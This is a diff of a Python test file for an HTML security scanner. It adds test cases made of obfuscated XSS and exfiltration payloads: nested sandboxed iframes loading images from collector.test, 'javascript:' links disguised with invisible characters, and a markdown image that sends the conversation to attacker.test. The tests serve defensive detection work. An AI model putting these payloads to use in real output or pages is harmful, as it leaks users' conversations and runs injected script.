@@ -656,6 +656,26 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ),
         ("<script type='text/javascript;charset=utf-8' src='https://collector.test/{c}.js'></script>", []),
         (
+            "<iframe sandbox srcdoc='&lt;noscript&gt;&lt;img src=&quot;https://collector.test/{c}.png&quot;&gt;'></iframe>",
+            ["exfiltration_query"],
+        ),
+        (
+            (
+                "<iframe sandbox='allow-same-origin' srcdoc='&lt;iframe srcdoc=&quot;&amp;lt;noscript&amp;gt;"
+                "&amp;lt;img src=https://collector.test/{c}.png&amp;gt;&quot;&gt;'></iframe>"
+            ),
+            ["exfiltration_query"],
+        ),
+        (
+            "<iframe sandbox='ALLOW-SCRIPTS' srcdoc='&lt;noscript&gt;&lt;img src=&quot;https://a.test/{c}.png&quot;&gt;'>",
+            [],
+        ),
+        ("<a href='java script:alert(1)'>x</a>", []),
+        ("<a href='java\u200bscript:alert(1)'>x</a>", []),
+        ("<a href='java\u00a0script:alert(1)'>x</a>", []),
+        ("<a href=' \x01javascript:alert(1)\x1f '>x</a>", ["script_uri"]),
+        ("<a href='java&#10;script:alert(1)'>x</a>", ["script_uri"]),
+        (
             (
                 "<div><template shadowrootmode='open'><base href='https://safe.test/'></template></div>"
                 "<base href='https://collector.test/?q={conversation}'><a href=''>send</a>"
@@ -1228,8 +1248,8 @@ class _ScanCountingList(list[Any]):
 def test_end_tags_never_scan_the_open_elements(monkeypatch: pytest.MonkeyPatch, text: str) -> None:
     original_init = catalog_security._HtmlUrls.__init__
 
-    def counting_init(self: Any) -> None:
-        original_init(self)
+    def counting_init(self: Any, **options: bool) -> None:
+        original_init(self, **options)
         self.open = _ScanCountingList()
         self.inert = _ScanCountingList()
 
